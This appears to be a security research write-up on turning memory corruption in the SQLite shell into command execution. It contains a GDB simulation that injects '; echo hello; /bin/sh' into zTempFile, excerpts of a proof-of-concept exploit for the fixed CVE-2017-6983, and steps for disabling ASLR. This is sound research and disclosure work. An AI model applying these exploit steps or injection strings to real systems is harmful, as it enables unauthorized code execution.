# Corrupting `doXdgOpen` to Attack SQLite

We try two methods to corrupt `doXdgOpen` to build attacks against SQLite, one via GDB simulation and another via a real-world vulnerablitiy. The vulnerability has been fixed so it will not cause immediate threat to exsiting SQLite installations.

With these corruptions attackers can execute arbitrary command on victim systems.

## Attack Simulation via GDB

To quickly confirm the feasiblity of building attacks, we use the GDB debugger to simulate an attacker who can write arbitrary value into arbitrary location through common memory safety issues, like buffer overflow or use-after-free.

In particular, we set `doXdgOpen` to `true` and set `zTempFile` to a malicious string `; echo 'hello'; /bin/sh`. When the execution continues, `echo 'hello'` and `/bin/sh` will be executed.

In the first step, we start an SQLite shell.

```bash
$ sqlite3
sqlite>
```

In another terminal, we attach GDB to the SQLite shell process

```bash
$ sudo gdb -p `pgrep sqlite3`  # make sure only one sqlite3 exists
```

Go to the `main` function frame, and update the two members of `ShellState`:

```bash
(gdb) bt                  # Print backtrace of all stack frames. Content may vary
#0  0x00007f3b44e5807b in __pselect (nfds=1, readfds=0x7ffd187094f0, writefds=0x0, exceptfds=0x0, timeout=<optimized out>, sigmask=0x7f3b45173c20 <_rl_orig_sigset>)
	at ../sysdeps/unix/sysv/linux/pselect.c:48
#1  0x00007f3b45153be9 in rl_getc () from /lib/x86_64-linux-gnu/libreadline.so.8
#2  0x00007f3b45154503 in rl_read_key () from /lib/x86_64-linux-gnu/libreadline.so.8
#3  0x00007f3b45139c82 in readline_internal_char () from /lib/x86_64-linux-gnu/libreadline.so.8
#4  0x00007f3b4513a4ed in readline () from /lib/x86_64-linux-gnu/libreadline.so.8
#5  0x0000000000431b88 in one_input_line (in=0x0, zPrior=0x0, isContinuation=0) at shell.c:656
#6  0x00000000004155b2 in process_input (p=0x7ffd187097c8) at shell.c:18343
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
(gdb) frame 7             # select the frame of main, which is #7 here
#7  0x000000000040a5f7 in main (argc=1, argv=0x7ffd1870adc8) at shell.c:19152
19152         rc = process_input(&data);
(gdb) p data.doXdgOpen    # show doXdgOpen before corruption
$1 = 0 '\000'
(gdb) p data.zTempFile    # show zTempFile before corruption
$2 = 0x0
(gdb) set data.doXdgOpen = 1                            # corrupt doXdgOpen
(gdb) set data.zTempFile = "; echo hello; /bin/sh"      # corrupt zTempFile
(gdb) p data.doXdgOpen    # show doXdgOpen after corruption
$3 = 1 '\001'
(gdb) p data.zTempFile    # show zTempFile after corruption
$4 = 0x7f3b44d42990 "; echo hello; /bin/sh"
```

Attack done. Now we can quit GDB.

```bash
(gdb) quit
Quit anyway? (y or n) y
```

Go to the SQLite shell, quit the shell

```bash
sqlite> .exit
sh: 1: xdg-open: not found   #<- reuslt of running "xdg-open "
hello                        #<- result of running "echo 'hello'"
$                            #<- result of runing "/bin/sh"
```

As we can see from the SQLite shell, SQLite executes command `system("xdg-open ; echo 'hello'; /bin/sh")`, which finally creates a terminal for attackers.

## Attack via Real-world (Fixed) Bugs

Attackers can use any memory-safety issues to corrupt `doXdgOpen` and `zTempFile` to achieve arbitrary code execution. These bugs are not rare.

#### 1. Gain arbitrary memory-write primitive

We utilize the following, old vulnerability to construct an attack. More details about this bug is also available via this link.

* [CVE-2017-6983](cve-2017-6983.md) 

#### 2. Compile SQLite

```bash
# in sqlite folder

CC="clang -DSQLITE_DEBUG" ./configure --enable-debug
make
```

#### 3. Proof-of-Concept (PoC)

We exploit the vulnerability twice to corrupt both `p->doXdgOpen` and `p->zTempFile` respectively. We disabled ASLR in this attack, so the address of `p` and faked structures are fixed. The complete PoC can be found in [doXdgOpen-poc.py](./doXdgOpen-poc.py).

Here are a few key steps among this attack

**(1) Corrupt `p->doXdgOpen` to 1**

```py
addr_ShellState = 0x7fffffffcf68		# get this address via GDB
offset_doXdgOpen_ShellState = 0xe

dst_ptr = addr_ShellState + offset_doXdgOpen_ShellState
bad_val = 0x1

# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
offset_sqlite3_value_zMalloc = 0x28
raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
zMalloc_val = dst_ptr
exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)

# malicious_content = Your-bad-value
exp = writeVal(exp, raddr_malicious_content, bad_val)
```

**(2) Corrupt `p->zTempFile` to `; ls`**

```py
addr_ShellState = 0x7fffffffcf68
offset_doXdgOpen_ShellState = 0xe
offset_zTempFile_ShellState = 0x98

safe_space_offset = 0x400                 # leave the 1st attack untouched
raddr_Fts3Cursor = safe_space_offset      # shift the first allocation

dst_ptr = addr_ShellState + offset_zTempFile_ShellState

# sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
offset_sqlite3_value_zMalloc = 0x28
raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
zMalloc_val = dst_ptr
exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)

# put "; bad-command" after malicious content
raddr_string = raddr_malicious_content + 0x10  # leave the malicious value untouched
exp = writeStr(exp, raddr_string, "--version; ls")

# malicious_content = Your-bad-value
exp = writeVal(exp, raddr_malicious_content, base + raddr_string)

```

**(3) Trigger the bug twice**

```py
with open('/tmp/exp', 'w') as f:
    f.write("create table t1(c1 char);\n")
    f.write("insert into t1 values(x'" + exp + "');\n")
    f.write("create virtual table a using fts3(b);\n")
    f.write("insert into a values(x'" + valToLittleEndianHex(base, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
    f.write("delete from a;\n")
    f.write("insert into a values(x'" + valToLittleEndianHex(base + safe_space_offset, 8) + "');\n")
    f.write("select optimize(b) from a;\n")
    f.write("select sqlite_version();\n")
```

**(4) Attack**

```bash
# clean up sqlite cache
$ rm -rf ~/.sqlite*

# Need to figure out the correct base address and shellstate address
# Check the CVE link above to figure out how

# generate the exploit poc /tmp/exp
$ python3 ./doXdgOpen-poc.py

# exploit within gdb
$ gdb ./sqlite3
gdb-peda$ r < /tmp/exp

Starting program: /home/hong/sqlite-for-viper/sqlite3 < /tmp/exp
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Runtime error near line 5: bad parameter or other API misuse (21)
Runtime error near line 8: bad parameter or other API misuse (21)
3.40.1
[Attaching after Thread 0x7ffff7dee740 (LWP 50258) vfork to child process 50261]
[New inferior 2 (process 50261)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 50258 after child exec]
[Inferior 1 (process 50258) detached]
process 50261 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7fa1740 (LWP 50261) vfork to child process 50263]
[New inferior 3 (process 50263)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 50261 after child exec]
[Inferior 2 (process 50261) detached]
process 50263 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
xdg-open 1.1.3
[Inferior 3 (process 50263) exited normally]

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
aclocal.m4        ext            lempar.c            manifest.uuid  peda-session-cat.txt        sqlite3           sqlite.pc.in
art               fts5.c         libsqlite3.la       mkkeywordhash  peda-session-dash.txt       sqlite3.1         src
autoconf          fts5.h         libtool             mkso.sh        peda-session-dbus-send.txt  sqlite3.c         test
config.guess      fts5parse.c    LICENSE.md          mksourceid     peda-session-groups.txt     sqlite3ext.h      tool
config.log        fts5parse.h    ltmain.sh           mptest         peda-session-ls.txt         sqlite3.h         tsrc
config.status     fts5parse.out  magic.txt           opcodes.c      peda-session-sqlite3.txt    sqlite3.lo        VERSION
config.sub        fts5parse.sql  main.mk             opcodes.h      peda-session-vim.nox.txt    sqlite3.o         vsixtest
configure         fts5parse.y    Makefile            parse.c        poc.py                      sqlite3.pc
configure.ac      input          Makefile.in         parse.h        poc-simple.py               sqlite3.pc.in
contrib           install-sh     Makefile.linux-gcc  parse.out      README.md                   sqlite3session.h
doc               keywordhash.h  Makefile.msc        parse.sql      shell.c                     sqlite_cfg.h
doXdgOpen-poc.py  lemon          manifest            parse.y        spec.template               sqlite_cfg.h.in
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.
```

## Tips

### Disable ASLR
```
cat /proc/sys/kernel/randomize_va_space
sudo sysctl kernel.randomize_va_space=0 
```

### Get size of a variable/type
```
print sizeof(val)
print sizeof(Type)
```

### Get offside of a member
```
gdb-peda$ p/x &(((Fts3Table *)0)->db)
```

### Clear cache
`rm ~/.sqlite*`
